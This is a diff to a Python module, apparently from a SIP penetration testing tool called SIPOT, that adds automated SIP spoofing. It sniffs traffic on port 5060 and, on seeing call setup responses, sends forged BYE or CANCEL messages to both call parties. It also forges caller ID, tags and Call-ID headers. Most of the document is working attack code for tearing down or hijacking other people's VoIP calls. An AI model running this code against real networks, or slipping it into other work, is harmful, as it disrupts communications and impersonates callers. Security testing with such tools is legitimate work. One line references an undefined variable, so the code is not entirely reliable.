@@ -2,13 +2,15 @@
 
 import sys, os, socket, multitask, random, ctypes
 from sipot import App, User, logger, bcolors
+from hashlib import md5
+from base64 import urlsafe_b64encode
 # scapy
 sys.path.append(''.join([os.getcwd(), '/lib/scapy']))
 from scapy.all import *
 
 # 39peers
 sys.path.append(''.join([os.getcwd(), '/lib/39peers/std']))
-import rfc3261, rfc2396
+import rfc3261, rfc2396, kutil
 # Others: [multitask, helper_functions]
 sys.path.append(''.join([os.getcwd(), '/lib/']))
 
@@ -28,6 +30,7 @@ class spooferUser(User):
 		self.spoof_auto = app.options.spoof_auto
         #Spoofer sets
 		self._spooferGen = None
+		self._snifferGen = None
         #Listener
 		self.listenerOff = True if self.spoof_mode in ['spfINVITE','spfBYE','spfCANCEL'] else False
 		self.spoof_method = {'spfINVITE':'INVITE','spfBYE':'BYE','spfCANCEL':'CANCEL'}[app.options.spoof_mode]
@@ -52,74 +55,51 @@ class spooferUser(User):
 				self._spooferGen  = self._spoofing()
 				multitask.add(self._spooferGen)
 		return self
+		
+	def add_sniffer(self):
+		if not self._snifferGen:
+			self._snifferGen  = self._sniffer(prn=self._auto_SIPrecvd, filter="ip and port 5060", store=0)
+			multitask.add(self._snifferGen)
+		return self
 	
-	def _auto_spoofing(self):
-		def autoBYE(message):
-			pass
-		def autoCANCEL(message):
-			pass
-		def SIPrecvd(pkt):
-			try: 
-				pkt = pkt[Raw].load
-			except IndexError: pass
-			#pkt = pkt.sprintf("{Raw:%Raw.load%\n}")
-			m = rfc3261.Message()
-			try:
-				m = rfc3261.Message(str(pkt))
-				#SIP message received -> AutoSpoof
-				if self.spoof_mode == 'autoBYE':
-					autoBYE(m)
-				if self.spoof_mode == 'autoCANCEL':
-					autoCANCEL(m)
-			except ValueError, E: pass # TODO: send 400 response to non-ACK request
-		try:
-			is_admin = os.getuid() == 0
-		except AttributeError:
-			is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-		if is_admin:
-			# Stop listener if not necessary in spoof mode
-			if self.listenerOff: self._listenerGen.close()
-			self.sock.close()
-			sniff(prn=SIPrecvd, filter="ip and port 5060 ", store=0)
-		else:
-			print (bcolors.FAIL+"\n***** Admin rights needed to sniff the network *****\n"+bcolors.ENDC)
-			self.app.stop()
-			yield
-			raise StopIteration()
-
-	def _spoofing(self):
-		# Msg to spoof generator ---------
-		def _createSpoofMessage():
-			if self.spoof_msg_file:
-				with open (self.spoof_msg_file, "r") as file_txt:
-					file_txt=file_txt.read()
-				m = rfc3261.Message()
-				try:
-					m = m._parse(file_txt.rstrip()+'\r\n\r\n\r\n')
-				except ValueError, E: pass # TODO: send 400 response to non-ACK request
+	# Spoof msg content ---------
+	def spoofMsg(self,message,dest=None):
+		def _createBYE(message,dest):
+			def BYEheaders(message):
+				'''Read-only list of transaction Header objects (To, From, CSeq, Call-ID)'''
+				return map(lambda x: message[x], ['To', 'From', 'Call-ID'])
+			m = rfc3261.Message.createRequest('BYE', str(self.remoteParty), BYEheaders(message))
+			if dest==1:
+				m['CSeq'] = rfc3261.Header('2 BYE', 'CSeq')
 			else:
-				m = self._ua.createRequest(self.spoof_method)
-				m.Contact = rfc3261.Header(str(self._stack.uri), 'Contact')
-				m.Contact.value.uri.user = self.localParty.uri.user
-				m.Expires = rfc3261.Header(str(self.app.options.register_interval), 'Expires')
-			return m
-		# Spoof msg content ---------
-		def spoofMsg(message):
-			def _createBYE(message):
-				def BYEheaders(message):
-					'''Read-only list of transaction Header objects (To, From, CSeq, Call-ID)'''
-					return map(lambda x: message[x], ['To', 'From', 'Call-ID'])
-				m = rfc3261.Message.createRequest('BYE', str(self.remoteParty), BYEheaders(message))
 				m['CSeq'] = rfc3261.Header(str(message.CSeq.number+1) + ' BYE', 'CSeq')
-				return m
-			def _createCANCEL(message):
-				def CANCELheaders(message):
-					'''Read-only list of transaction Header objects (To, From, CSeq, Call-ID)'''
-					return map(lambda x: message[x], ['To', 'From', 'CSeq', 'Call-ID'])
-				m = rfc3261.Message.createRequest('CANCEL', str(self.remoteParty), CANCELheaders(message))
-				if message and message.Route: m.Route = message.Route
-				if message: m.Via = message.first('Via') # only top Via included
-				return m
+			return m
+		def _createCANCEL(message):
+			def CANCELheaders(message):
+				'''Read-only list of transaction Header objects (To, From, CSeq, Call-ID)'''
+				return map(lambda x: message[x], ['To', 'From', 'CSeq', 'Call-ID'])
+			m = rfc3261.Message.createRequest('CANCEL', str(self.remoteParty), CANCELheaders(message))
+			if message and message.Route: m.Route = message.Route
+			if message: m.Via = message.first('Via') # only top Via included
+			return m
+		# Auto Spoofs -----------
+		if self.spoof_auto:
+			if self.spoof_mode == 'spfBYE':
+				if dest==1:
+					from_Header = message.From
+					to_Header =  message.To
+					message['Via'] = rfc3261.Header('SIP/2.0/UDP '+str(message.To.value.uri.host)+(':'+str(message.To.value.uri.port) if (m7.To.value.uri.port) else '')+';branch='+('z9hG4bK' + str(urlsafe_b64encode(md5('All That is Gold Does Not Glitter').digest())).replace('=','.'))+';rport', 'Via')
+					message['To'] = rfc3261.Header(str(from_Header), 'To')
+					message['From'] = rfc3261.Header(str(to_Header), 'From')
+				self.remoteParty = rfc3261.Address(str(message.To.value.uri))
+				self.remoteParty.uri.port = self.app.options.port
+				message = _createBYE(message,dest)
+			if self.spoof_mode == 'spfCANCEL':
+				self.remoteParty = rfc3261.Address(str(message.To.value.uri))
+				self.remoteParty.uri.port = self.app.options.port
+				message = _createCANCEL(message)
+		# Manual Spoofs ---------
+		else:
 			# Spoofs ---------
 			if self.spoof_mode == 'spfINVITE':
 				self.spoof_name = 'SIPOT Caller ID'
@@ -139,12 +119,121 @@ class spooferUser(User):
 				message.To.tag = self.spoof_local_tag
 			if self.spoof_callID:
 				message['Call-ID'] = rfc3261.Header(self.spoof_callID, 'Call-ID')
-			return message
+		return message
+
+	def _auto_SIPrecvd(self,pkt):
+		try: 
+			pkt = pkt[Raw].load
+		except IndexError: pass
+		m = rfc3261.Message()
+		try:
+			m = rfc3261.Message(str(pkt))
+			#SIP message received -> AutoSpoof
+			if self.spoof_mode == 'spfBYE':
+				if (str(m.response) == "200") and (m.Cseq.method == "INVITE"):
+					# To host 0
+					spoof_message = self.spoofMsg(m)
+					print "-------Sending BYE to: "+str(self.remoteParty.uri.hostPort)+"-------"
+					print spoof_message
+					self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
+					# To host 1
+					spoof_message = self.spoofMsg(m,1)
+					print "-------Sending BYE to: "+str(self.remoteParty.uri.hostPort)+"-------"
+					print spoof_message
+					self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
+			if self.spoof_mode == 'spfCANCEL':
+				if (str(m.response) == "180"):
+					spoof_message = self.spoofMsg(m)
+					print "-------Sending CANCEL to: "+str(self.remoteParty.uri.hostPort)+"-------"
+					print spoof_message
+					self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
+		except ValueError, E: pass # TODO: send 400 response to non-ACK request
+	def _auto_spoofing(self):
+		try:
+			is_admin = os.getuid() == 0
+		except AttributeError:
+			is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+		if is_admin:
+			# Stop listener if not necessary in spoof mode
+			if self.listenerOff: self._listenerGen.close()
+			self.sock.close()
+			self.add_sniffer()
+		else:
+			print (bcolors.FAIL+"\n***** Admin rights needed to sniff the network *****\n"+bcolors.ENDC)
+			self.app.stop()
+			yield
+			raise StopIteration()
+
+	# Modified scapy sniff function ---------
+	@conf.commands.register
+	def _sniffer(self,count=0, store=1, offline=None, prn = None, lfilter=None, L2socket=None, timeout=None,
+			  opened_socket=None, stop_filter=None, *arg, **karg):
+		c = 0
+		if opened_socket is not None:
+			s = opened_socket
+		else:
+			if offline is None:
+				if L2socket is None:
+					L2socket = conf.L2listen
+				s = L2socket(type=ETH_P_ALL, *arg, **karg)
+			else:
+				s = PcapReader(offline)
+
+		lst = []
+		if timeout is not None:
+			stoptime = time.time()+timeout
+		remain = None
+		while 1:
+			try:
+				if timeout is not None:
+					remain = stoptime-time.time()
+					if remain <= 0:
+						break
+				sel = select([s],[],[],remain)
+				if s in sel[0]:
+					p = s.recv(MTU)
+					if p is None:
+						break
+					if lfilter and not lfilter(p):
+						continue
+					if store:
+						lst.append(p)
+					c += 1
+					if prn:
+						r = prn(p)
+						if r is not None:
+							print r
+					if stop_filter and stop_filter(p):
+						break
+					if count > 0 and c >= count:
+						break
+			except KeyboardInterrupt:
+				break
+			yield
+		if opened_socket is None:
+			s.close()
+		yield plist.PacketList(lst,"Sniffed")
+
+	def _spoofing(self):
+		# Msg to spoof generator ---------
+		def _createSpoofMessage():
+			if self.spoof_msg_file:
+				with open (self.spoof_msg_file, "r") as file_txt:
+					file_txt=file_txt.read()
+				m = rfc3261.Message()
+				try:
+					m = m._parse(file_txt.rstrip()+'\r\n\r\n\r\n')
+				except ValueError, E: pass # TODO: send 400 response to non-ACK request
+			else:
+				m = self._ua.createRequest(self.spoof_method)
+				m.Contact = rfc3261.Header(str(self._stack.uri), 'Contact')
+				m.Contact.value.uri.user = self.localParty.uri.user
+				m.Expires = rfc3261.Header(str(self.app.options.register_interval), 'Expires')
+			return m
 		# Stop listener if not necessary in spoof mode
 		if self.listenerOff: self._listenerGen.close()
 		try:
-			spoof_message = spoofMsg(_createSpoofMessage())
-			print spoof_message
+			spoof_message = self.spoofMsg(_createSpoofMessage())
 			if not self.listenerOff:
 				self._ua.sendRequest(spoof_message)
 				while True:
@@ -171,16 +260,48 @@ class spooferUser(User):
 		yield
 		raise StopIteration()
 
+	# rfc3261.Transport related methods
+	def send(self, data, addr, stack):
+		'''Send data to the remote addr.'''
+		def _send(self, data, addr): # generator version
+			# Reconfig socket needed because of scapy -------------------
+			sock = socket.socket(type=socket.SOCK_DGRAM if self.app.options.transport == self.UDP else socket.SOCK_STREAM)
+			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+			sock.bind((self.app.options.int_ip, (self.app.options.port+1) if self.app.options.transport == self.TLS else self.app.options.port))
+			self.sock, self.sockaddr, self.nat = sock, kutil.getlocaladdr(sock), self.app.options.fix_nat
+			#------------------------------------------------------------
+			try:
+				logger.debug('sending[%d] to %s\n%s'%(len(data), addr, data))
+				if self.sock:
+					if self.sock.type == socket.SOCK_STREAM:
+						try: 
+							remote = self.sock.getpeername()
+							if remote != addr:
+								logger.debug('connected to wrong addr', remote, 'but sending to', addr)
+						except socket.error: # not connected, try connecting
+							try:
+								self.sock.connect(addr)
+							except socket.error:
+								logger.debug('failed to connect to', addr)
+						try:
+							yield self.sock.send(data)
+						except socket.error:
+							logger.debug('socket error in send')
+					elif self.sock.type == socket.SOCK_DGRAM:
+						try:
+							yield self.sock.sendto(data, addr)
+						except socket.error:
+							logger.debug('socket error in sendto' )
+					else:
+						logger.debug('invalid socket type', self.sock.type)
+			except AttributeError: pass
+		multitask.add(_send(self, data, addr))
+
 class SpoofingApp(App):
 	def __init__(self, options):
 		App.__init__(self,options)
 		logger.info("ntsga: init spoofing app")
 		
-		
-		
-		
-		
-
 	def start(self):
 		self.createUser()
 		self.user = self.user.add_listenerGen()
